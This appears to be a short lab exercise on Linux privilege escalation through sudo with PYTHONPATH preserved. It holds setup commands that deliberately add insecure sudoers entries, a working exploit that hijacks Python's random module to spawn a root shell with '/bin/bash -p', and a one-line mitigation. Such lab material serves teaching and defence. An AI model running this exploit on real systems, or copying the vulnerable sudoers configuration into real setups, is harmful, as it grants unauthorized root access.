# Setup

```sh
# root
adduser user3
echo "user3 ALL=(ALL) NOPASSWD: /usr/bin/python /home/user3/script.py" >> /etc/sudoers
echo "Defaults env_keep += PYTHONPATH" >> /etc/sudoers
echo 'import random; print(random.randint(1, 10))' > /home/user3/script.py
```

# Exploit

```bash
echo 'import os' > /tmp/random.py
echo 'os.system("/bin/bash -p")' >> /tmp/random.py

export PYTHONPATH=/tmp
sudo /home/user3/script.py
```


# Mitigate

```bash
# Remove env_keep += PYTHONPATH
```